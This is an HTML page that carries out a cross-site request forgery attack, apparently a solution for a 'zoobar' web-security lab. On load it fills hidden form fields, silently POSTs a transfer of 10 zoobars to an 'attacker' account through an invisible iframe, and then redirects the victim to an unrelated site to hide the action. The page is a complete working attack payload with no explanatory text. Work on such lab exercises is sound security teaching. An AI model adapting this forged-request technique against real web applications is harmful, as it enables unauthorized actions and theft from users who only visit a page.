<!DOCTYPE html>
<html>
  <head>
    <script>
      function transfer() {
        document.getElementsByName("zoobars")[0].value = "10";
        document.getElementsByName("recipient")[0].value = "attacker";
        document.getElementsByName("targetframe")[0].addEventListener("load", mit, false);
        document.getElementsByName("transferform")[0].submit();
      }
      function mit() {
        document.location = "http://cse.iitk.ac.in/";
      }
    </script>
  </head>
  <body onload="transfer();">
    <iframe style="visibility:hidden; height:0; width:0; position:absolute" name="targetframe" id="targetframe"></iframe>
    <form method="POST" name="transferform" action="http://localhost:8080/zoobar/index.cgi/transfer" target="targetframe">
      <input name="zoobars" type="text" value="" style="display:none">
      <input name="recipient" type="text" value="" style="display:none">
    </form>
  </body>
</html>
